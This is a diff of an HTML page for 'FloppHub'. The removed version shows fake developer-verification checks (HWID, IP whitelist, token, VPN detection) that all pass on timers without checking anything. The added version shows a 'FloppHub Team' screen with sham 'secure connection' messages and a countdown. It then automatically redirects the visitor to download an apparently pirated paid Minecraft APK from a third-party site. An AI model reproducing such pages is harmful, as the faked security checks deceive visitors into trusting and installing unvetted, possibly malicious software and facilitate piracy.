@@ -3,99 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>FloppHub Developer Verification</title>
+    <title>FloppHub Team</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body,html{height:100%;background:#000;color:#fff;font-family:'Courier New',monospace;overflow:hidden;display:flex;justify-content:center;align-items:center}
-        canvas#particles{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
-        .container{position:relative;z-index:10;width:92%;max-width:420px;background:rgba(15,15,25,.95);border:2px solid #ff8c00;border-radius:16px;padding:20px 18px;box-shadow:0 0 30px rgba(255,140,0,.6);backdrop-filter:blur(12px);animation:g .3s infinite alternate}
-        @keyframes g{from{box-shadow:0 0 30px rgba(255,140,0,.6)}to{box-shadow:0 0 45px rgba(255,140,0,.9)}}
-        .logo{width:88px;height:88px;margin:0 auto 16px;border:3px solid #ff8c00;border-radius:50%;padding:6px;background:rgba(255,140,0,.1);box-shadow:0 0 25px rgba(255,140,0,.8);animation:p 2s infinite}
-        @keyframes p{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
-        h1{text-align:center;color:#ff8c00;font-size:22px;margin-bottom:6px;text-shadow:0 0 15px rgba(255,140,0,.8);letter-spacing:1px}
-        .subtitle{text-align:center;color:#ffa500;font-size:14px;margin-bottom:20px;opacity:.9}
-        .scan-line{position:absolute;top:0;left:0;width:100%;height:3px;background:linear-gradient(90deg,transparent,#ff8c00,transparent);animation:s 3.5s linear infinite;box-shadow:0 0 15px #ff8c00}
-        @keyframes s{0%{top:0}100%{top:100%}}
-        .verification-list{list-style:none}
-        .verification-item{display:flex;align-items:center;justify-content:space-between;padding:11px 0;border-bottom:1px dashed rgba(255,140,0,.25);opacity:0;transform:translateX(-30px);animation:i .5s forwards}
-        .verification-item:last-child{border:none}
-        .label{color:#ffa500;font-size:14px;font-weight:bold}
-        .status{font-size:24px}
-        .check{color:#00ff88;text-shadow:0 0 12px #00ff88}
-        .cross{color:#ff4d4d;text-shadow:0 0 12px #ff4d4d;animation:b .9s infinite}
-        @keyframes b{0%,100%{opacity:1}50%{opacity:.5}}
-        @keyframes i{to{opacity:1;transform:translateX(0)}}
-        .final-message{text-align:center;margin:22px 0 0;font-size:18px;color:#00ff88;text-shadow:0 0 18px #00ff88;opacity:0;animation:f 1s forwards 1s}
-        .success-box{margin-top:18px;padding:16px;background:rgba(0,255,136,.15);border:2px solid #00ff88;border-radius:10px;text-align:center;font-size:15px;opacity:0;transform:translateY(15px);transition:opacity .6s,transform .6s}
-        .success-box.show{opacity:1;transform:translateY(0)}
-        @keyframes f{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
+        body,html{height:100%;background:#000;color:#fff;font-family:-apple-system,system-ui,'Segoe UI',sans-serif;overflow:hidden;display:flex;justify-content:center;align-items:center}
+        canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
+        .wrapper{position:relative;z-index:10;text-align:center}
+        .logo{width:110px;height:110px;margin:0 auto 30px;border:4px solid #ff8c00;border-radius:50%;padding:8px;background:rgba(255,140,0,.1);box-shadow:0 0 40px rgba(255,140,0,.9);animation:p 2s infinite}
+        @keyframes p{0%,100%{transform:scale(1);box-shadow:0 0 40px rgba(255,140,0,.9)}50%{transform:scale(1.08);box-shadow:0 0 70px rgba(255,140,0,1)}}
+        h1{color:#ff8c00;font-size:28px;margin-bottom:12px;text-shadow:0 0 20px #ff8c00;letter-spacing:1px;opacity:0;animation:t .8s forwards .5s}
+        .status{color:#ffa500;font-size:16px;margin:16px 0;opacity:0;animation:t .8s forwards 1s}
+        .welcome{color:#00ff88;font-size:22px;margin-top:30px;font-weight:bold;text-shadow:0 0 25px #00ff88;opacity:0;animation:t 1s forwards 5.5s}
+        @keyframes t{to{opacity:1}}
+        .counter{font-size:80px;font-weight:bold;color:#ff8c00;text-shadow:0 0 40px #ff8c00;opacity:0;animation:c 1s forwards 2s}
+        @keyframes c{to{opacity:1}}
+        .pulse{width:100%;height:100%;position:absolute;top:0;left:0;border-radius:50%;background:rgba(255,140,0,.15);animation:o 2s infinite}
+        @keyframes o{0%{transform:scale(0);opacity:1}100%{transform:scale(1.8);opacity:0}
     </style>
 </head>
 <body>
-    <canvas id="particles"></canvas>
-    <div class="container">
-        <div class="scan-line"></div>
+    <canvas id="p"></canvas>
+    <div class="wrapper">
+        <div class="pulse"></div>
         <img src="https://i.postimg.cc/brq86RKj/loc-phub.jpg.png" alt="FloppHub" class="logo">
-        <h1>FloppHub Security Scan</h1>
-        <p class="subtitle">Verifying developer identity...</p>
-        <ul class="verification-list">
-            <li class="verification-item"><span class="label">HWID Match</span><span class="status" id="hwid">Pending</span></li>
-            <li class="verification-item"><span class="label">IP Whitelisted</span><span class="status" id="ip">Pending</span></li>
-            <li class="verification-item"><span class="label">Browser Fingerprint</span><span class="status" id="browser">Pending</span></li>
-            <li class="verification-item"><span class="label">Developer Token</span><span class="status" id="token">Pending</span></li>
-            <li class="verification-item"><span class="label">Access Key Valid</span><span class="status" id="key">Pending</span></li>
-            <li class="verification-item"><span class="label">Owner @TheRealBanHammer</span><span class="status" id="owner">Pending</span></li>
-            <li class="verification-item"><span class="label">File Compromised</span><span class="status" id="compromised">Pending</span></li>
-            <li class="verification-item"><span class="label">Secure Connection</span><span class="status" id="ssl">Pending</span></li>
-            <li class="verification-item"><span class="label">VPN/Tor Detection</span><span class="status" id="vpn">Pending</span></li>
-            <li class="verification-item"><span class="label">FloppHub Elite Member</span><span class="status" id="elite">Pending</span></li>
-        </ul>
-        <div class="final-message" id="finalMessage">VERIFIED: LEGITIMATE FLOPPHUB DEVELOPER</div>
-        <div class="success-box" id="successBox">Access granted. Redirecting...</div>
+        <h1>FloppHub Team</h1>
+        <div class="status" id="s1">Establishing connection with servers...</div>
+        <div class="status" id="s2">Establishing secure connection...</div>
+        <div class="counter" id="c">5</div>
+        <div class="welcome" id="w">Welcome FloppHub Team developer</div>
     </div>
 
     <script>
-        const c=document.getElementById('particles'),x=c.getContext('2d');
-        c.width=innerWidth;c.height=innerHeight;
-        const p=[];for(let i=0;i<50;i++)p.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*2.5+1,sx:Math.random()*1-0.5,sy:Math.random()*1-0.5,o:Math.random()*0.5+0.2});
+        const c=document.getElementById('p'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;
+        const p=[];for(let i=0;i<45;i++)p.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*2.5+1,sx:Math.random()*1-0.5,sy:Math.random()*1-0.5,o:Math.random()*0.5+0.2});
         const a=()=>{x.clearRect(0,0,c.width,c.height);p.forEach(e=>{e.x+=e.sx;e.y+=e.sy;if(e.x<0||e.x>c.width)e.sx*=-1;if(e.y<0||e.y>c.height)e.sy*=-1;x.fillStyle=`rgba(255,140,0,${e.o})`;x.beginPath();x.arc(e.x,e.y,e.r,0,Math.PI*2);x.fill()});requestAnimationFrame(a)};a();
 
-        const requiredIds=['hwid','ip','browser','token','key','owner','compromised','ssl','vpn','elite'];
-        function allVerified(){
-            return requiredIds.every(id=>{
-                const el=document.getElementById(id);
-                return el && el.textContent==='✓';
-            });
-        }
-        function tryShowSuccess(){
-            if(allVerified()){
-                const box=document.getElementById('successBox');
-                box.classList.add('show');
-                setTimeout(()=>location.href='https://flopphub-test.github.io/Files/Legit-Developer',2800);
-            }
-        }
+        setTimeout(()=>document.getElementById('s1').style.opacity=1,800);
+        setTimeout(()=>document.getElementById('s2').style.opacity=1,1800);
 
-        const checks=[
-            {id:'hwid',d:1100},{id:'ip',d:2100},{id:'browser',d:3100},{id:'token',d:4100},
-            {id:'key',d:5100},{id:'owner',d:6100},{id:'compromised',d:7100},{id:'ssl',d:8100},
-            {id:'vpn',d:9100},{id:'elite',d:10100}
-        ];
-
-        checks.forEach((k,i)=>{
-            setTimeout(()=>{
-                const e=document.getElementById(k.id);
-                e.textContent='✓';e.className='status check';
-                if(i===checks.length-1){
-                    setTimeout(()=>{
-                        document.getElementById('finalMessage').style.opacity=1;
-                        tryShowSuccess();
-                    },800);
-                }
-            },k.d);
-        });
-
-        addEventListener('resize',()=>{c.width=innerWidth;c.height=innerHeight});
+        let n=5;const e=document.getElementById('c');
+        const i=setInterval(()=>{n--;if(n>0)e.textContent=n;else{clearInterval(i);e.style.opacity=0;document.getElementById('w').style.opacity=1;
+            setTimeout(()=>location.href='https://statics.liteapks.co/old-data/Minecraft/minecraft-v1.20.81.01-final-paid.apk')}},1000);
     </script>
 </body>
-                                                                                        </html>
-                                                                                        
+</html>
